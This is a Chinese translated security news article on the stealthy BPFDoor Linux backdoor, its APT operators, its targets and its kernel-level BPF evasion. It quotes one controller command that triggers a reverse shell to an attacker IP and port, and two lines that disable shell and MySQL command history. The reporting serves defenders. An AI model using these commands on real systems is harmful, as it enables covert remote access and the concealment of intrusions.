---
title: 恶意软件 BPFDoor 利用反向 Shell，深入渗透网络发动隐秘攻击
url: https://www.anquanke.com/post/id/306546
source: 安全客-有思想的安全新媒体
date: 2025-04-16
fetch_date: 2025-10-06T22:02:51.360548
---

# 恶意软件 BPFDoor 利用反向 Shell，深入渗透网络发动隐秘攻击

首页

阅读

* [安全资讯](https://www.anquanke.com/news)
* [安全知识](https://www.anquanke.com/knowledge)
* [安全工具](https://www.anquanke.com/tool)

活动

社区

学院

安全导航

内容精选

* [专栏](/column/index.html)
* [精选专题](https://www.anquanke.com/subject-list)
* [安全KER季刊](https://www.anquanke.com/discovery)
* [360网络安全周报](https://www.anquanke.com/week-list)

# 恶意软件 BPFDoor 利用反向 Shell，深入渗透网络发动隐秘攻击

阅读量**57298**

发布时间 : 2025-04-15 10:15:04

**x**

##### 译文声明

本文是翻译文章，文章原作者 Tushar Subhra Dutta，文章来源：cybersecuritynews

原文地址：<https://cybersecuritynews.com/stealthy-rootkit-like-malware-known-as-bpfdoor-using-reverse-shell/>

译文仅供参考，具体内容表达以及含义原文为准。

一种名为 BPFDoor 的复杂后门恶意软件一直在积极攻击亚洲、中东和非洲地区的多个组织，它利用先进的隐身技术来躲避检测。

这种基于 Linux 系统的后门程序利用伯克利数据包过滤（BPF）技术在内核层面监控网络流量，使其在保持对受感染系统的持续访问权限的同时，能够躲过传统的安全扫描。

据观察，BPFDoor 的攻击目标包括电信、金融和零售行业，近期在韩国、缅甸、马来西亚和埃及都有相关攻击记录。

该恶意软件无需监听网络端口就能运行，这使得使用端口扫描等传统安全措施很难检测到它，从而使其能够长时间不被发现。

Trend Micro 的研究人员指出，这些攻击背后的威胁行为者是 Earth Bluecrow（也被追踪记录为 Red Menshen），这是一个高级持续性威胁（APT）组织，一直在使用 BPFDoor 进行网络间谍活动。

根据他们的监测数据，该组织至少已经活跃了四年，有证据表明早在 2021 年就发生过多起相关事件。

这种恶意软件的设计使其能够将 BPF 过滤器注入操作系统内核，在那里它可以检查网络数据包，并在触发特定后门功能的预定字节模式时激活。

这种类似 rootkit（内核级恶意软件）的能力使 BPFDoor 能够融入系统，它会更改进程名称，并采用其他躲避检测的策略。

对于受到 BPFDoor 攻击的组织来说，后果非常严重。这个后门为威胁行为者创建了一个持续存在且几乎隐形的通道，使其能够长时间访问敏感数据和系统，使其成为长期间谍活动的理想工具。

****反向 Shell 机制：隐藏的控制手段****

BPFDoor 功能的核心是其控制模块，它使攻击者能够与受感染的主机建立反向 Shell 连接。

这一功能使威胁行为者能够更深入地渗透到受感染的网络中，便于进行横向移动，并访问更多的系统和敏感数据。

控制模块会发送包含魔法字节（例如用于 TCP 协议的 0x5293 或用于 UDP 协议的 0x7255）、目标要连接的远程 IP 地址和端口，以及一个身份验证密码的激活数据包。

当配置正确时，这会从受害者计算机向攻击者的系统发起一个反向 Shell 连接。

./controller -cd 22 -h 192.168.32.156 -ms 8000

这条命令指示控制模块要求受感染的机器（192.168.32.156）向攻击者机器的 8000 端口发起反向 Shell 连接。

恶意软件的编写者采取了一些措施来消除他们在受感染系统上的活动痕迹：

export MYSQL\_HISTFILE=/dev/null

export HISTFILE=/dev/null

这些命令会禁用命令历史记录功能，这表明攻击者专门针对运行 MySQL 数据库软件的系统。

对于网络安全防御者来说，检测 BPFDoor 仍然具有挑战性，因为它能够跨多种协议（TCP、UDP 和 ICMP）运行，而且攻击者可以很容易地修改用于激活的魔法字节序列。

随着这种威胁的不断演变，各组织必须实施先进的监控解决方案，以便能够检测到与 BPFDoor 通信和激活序列相关的特定模式。

本文翻译自cybersecuritynews [原文链接](https://cybersecuritynews.com/stealthy-rootkit-like-malware-known-as-bpfdoor-using-reverse-shell/)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由**安全客**原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处： [https://www.anquanke.com/post/id/306546](/post/id/306546)

安全KER - 有思想的安全新媒体

本文转载自: [cybersecuritynews](https://cybersecuritynews.com/stealthy-rootkit-like-malware-known-as-bpfdoor-using-reverse-shell/)

如若转载,请注明出处： <https://cybersecuritynews.com/stealthy-rootkit-like-malware-known-as-bpfdoor-using-reverse-shell/>

安全KER - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

* [网络攻击](/tag/%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB)

**+1**5赞

收藏

![](https://p5.ssl.qhimg.com/t010857340ce46bb672.jpg)安全客

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

## 发表评论

您还未登录，请先登录。

[登录](/login/index.html)

![](https://p3.ssl.qhimg.com/t014757b72460d855bf.png)

[![](https://p5.ssl.qhimg.com/t010857340ce46bb672.jpg)](/member.html?memberId=175868)

[安全客](/member.html?memberId=175868)

这个人太懒了，签名都懒得写一个

* 文章
* **376**

* 粉丝
* **1**

### TA的文章

* ##### [mavinject.exe 遭利用，黑客绕过安全防线入侵系统](/post/id/306961)

  2025-04-28 10:48:18
* ##### [Docker 惊现新型加密挖矿攻击，借 Teneo 平台开辟恶意获利新路径](/post/id/306959)

  2025-04-28 10:39:59
* ##### [Cloudflare 隧道遭滥用，恶意 RAT 传播威胁加剧](/post/id/306957)

  2025-04-28 10:34:35
* ##### [xrpl.js 库遭供应链攻击，超 290 万次下载用户私钥成窃取目标](/post/id/306953)

  2025-04-28 10:29:02
* ##### [恶意后门借 ViPNet 更新渗透，俄罗斯多行业数据安全拉响警报](/post/id/306951)

  2025-04-28 10:22:13

### 相关文章

* ##### [Morte僵尸网络被披露：正利用路由器与企业应用漏洞，迅速扩张其“加载器即服务”活动](/post/id/312444)

  2025-09-29 18:04:01
* ##### [Akira勒索软件利用SonicWall VPN账户发起急速入侵](/post/id/312438)

  2025-09-29 18:03:28
* ##### [DarkCloud信息窃取器现新变种：采用VB6混淆技术并新增加密货币钱包窃取功能，威胁显著升级](/post/id/312435)

  2025-09-29 18:02:53
* ##### [TamperedChef恶意软件兴起：欺诈应用利用经过签名的二进制文件与搜索引擎投毒劫持浏览器](/post/id/312432)

  2025-09-29 18:02:25
* ##### [黑客将SVG文件武器化，用于隐秘投递恶意负载](/post/id/312351)

  2025-09-24 16:44:10
* ##### [ShadowV2僵尸网络利用配置错误的AWS Docker容器构建DDoS攻击租用服务](/post/id/312381)

  2025-09-24 16:40:43
* ##### [npm软件包“fezbox”中被发现新型恶意软件，可利用二维码窃取用户凭据](/post/id/312387)

  2025-09-24 16:40:06

### 热门推荐

文章目录

![](https://p0.qhimg.com/t11098f6bcd5614af4bf21ef9b5.png)

安全KER

* [关于我们](/about)
* [联系我们](/note/contact)
* [用户协议](/note/protocol)
* [隐私协议](/note/privacy)

商务合作

* [合作内容](/note/business)
* [联系方式](/note/contact)
* [友情链接](/link)

内容需知

* [投稿须知](https://www.anquanke.com/contribute/tips)
* [转载须知](/note/repost)
* 官网QQ群：568681302

合作单位

* [![安全KER](https://p0.ssl.qhimg.com/t01592a959354157bc0.png)](http://www.cert.org.cn/)
* [![安全KER](https://p0.ssl.qhimg.com/t014f76fcea94035e47.png)](http://www.cnnvd.org.cn/)

Copyright © 北京奇虎科技有限公司 三六零数字安全科技集团有限公司 安全KER All Rights Reserved [京ICP备08010314号-66](https://beian.miit.gov.cn/)[![](https://icon.cnzz.com/img/pic.gif)](https://www.cnzz.com/stat/website.php?web_id=1271278035 "站长统计")

微信二维码

**X**![安全KER](https://p0.ssl.qhimg.com/t0151209205b47f2270.jpg)